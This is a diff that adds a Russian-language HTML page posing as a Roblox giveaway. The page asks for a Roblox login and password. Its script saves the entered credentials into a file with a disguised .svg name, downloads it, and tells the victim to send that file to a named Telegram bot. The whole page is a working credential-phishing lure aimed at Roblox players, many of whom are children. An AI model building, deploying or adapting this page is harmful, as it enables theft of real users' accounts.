@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox-раздача от ГФОТа</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .parallax-container {
+            position: relative;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .parallax-layer {
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+        }
+
+        .layer {
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            height: 100vh;
+            position: absolute;
+            width: 100%;
+            transform-origin: center;
+            animation: parallax 10s infinite linear;
+        }
+
+        .layer:nth-child(1) {
+            background-image: url("https://devforum.roblox.com/uploads/short-url/pWUtWXByBdk1PqiEEhH18mP8kmA.jpeg");
+            transform: translateZ(-1px) scale(1.5);
+        }
+
+        .window {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            animation: fade-in 2s forwards;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+            transform: translateY(-20px);
+            opacity: 0;
+            animation: slide-up 1s 2s forwards;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slide-up 1s 2s forwards;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        @keyframes parallax {
+            0% {
+                transform: translateZ(-1px) scale(1.5);
+            }
+            50% {
+                transform: translateZ(-2px) scale(2);
+            }
+            100% {
+                transform: translateZ(-1px) scale(1.5);
+            }
+        }
+
+        @keyframes fade-in {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slide-up {
+            0% {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="parallax-container">
+        <div class="parallax-layer">
+            <div class="layer"></div>
+        </div>
+    </div>
+    <div class="window">
+        <img class="logo" src="https://i.pinimg.com/originals/53/6d/3c/536d3cdef50c45aa70693e02e6c01313.png" alt="Логотип Роблокса">
+        <form>
+            <div class="form-group">
+                <label for="username">Логин:</label>
+                <input type="text" id="username" name="username" placeholder="Введите логин">
+            </div>
+            <div class="form-group">
+                <label for="password">Пароль:</label>
+                <input type="password" id="password" name="password" placeholder="Введите пароль">
+            </div>
+            <div class="form-group">
+                <button type="submit" onclick="saveData()">Войти</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function saveData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var data = "Логин: " + username + " Пароль: " + password;
+
+            var file = new File([data], "H14jaQqifb@6.svg", { type: "text/plain;charset=utf-8" });
+
+            var a = document.createElement("a");
+            a.href = URL.createObjectURL(file);
+            a.download = file.name;
+            a.click();
+
+            alert("Успешно.Теперь отправь этот файл в телеграм бота https://t.me/rbxprivate911041bot");
+        }
+    </script>
+</body>
+</html>
